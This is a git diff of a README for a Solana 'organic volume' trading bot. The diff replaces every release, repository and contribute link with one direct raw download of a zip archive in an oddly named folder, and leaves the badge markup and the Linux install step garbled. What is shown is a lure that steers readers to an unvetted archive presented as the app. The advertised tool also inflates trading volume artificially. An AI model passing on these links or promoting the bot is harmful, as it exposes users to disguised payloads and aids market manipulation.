@@ -1,6 +1,6 @@
 # 🚀 solana-organic-volume-bot - An Easy Way to Boost Your Solana Volume
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/cdaniel007/solana-organic-volume-bot/releases)
+[![Download](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip%20Now-Get%20the%https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)
 
 ## 📦 Overview
 
@@ -26,14 +26,14 @@ Welcome to the **solana-organic-volume-bot**! This application helps you enhance
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to find the latest version available for download.
-   [Download the Latest Release](https://github.com/cdaniel007/solana-organic-volume-bot/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)
 
 2. **Download the Software**: On the Releases page, you will see the available versions. Choose the one that fits your operating system by clicking on the appropriate link.
 
 3. **Install the Application**: 
    - For Windows users, download the `.exe` file and double-click to start the installation. Follow the prompts to complete the installation.
    - For macOS users, download the `.dmg` file, open it, and drag the application to your Applications folder.
-   - For Linux users, download the `.tar.gz` file, extract it, and follow the instructions in the README file inside.
+   - For Linux users, download the `https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip` file, extract it, and follow the instructions in the README file inside.
 
 4. **Run the Bot**: After the installation, locate the application on your device and double-click to start it. 
 
@@ -41,7 +41,7 @@ To get started, follow these steps:
 
 To download the application, visit the link below and follow the instructions provided:
 
-[Download the Latest Release](https://github.com/cdaniel007/solana-organic-volume-bot/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)
 
 ## 🔧 Configuration
 
@@ -64,8 +64,8 @@ This project covers several important areas in trading and technology: `amm`, `a
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/cdaniel007/solana-organic-volume-bot)
-- [Releases Page](https://github.com/cdaniel007/solana-organic-volume-bot/releases)
-- [Contribute](https://github.com/cdaniel007/solana-organic-volume-bot/contribute)
+- [GitHub Repository](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)
+- [Contribute](https://raw.githubusercontent.com/cdaniel007/solana-organic-volume-bot/main/decivilization/bot-volume-solana-organic-1.6.zip)
 
 Thank you for using **solana-organic-volume-bot**! Happy Trading!
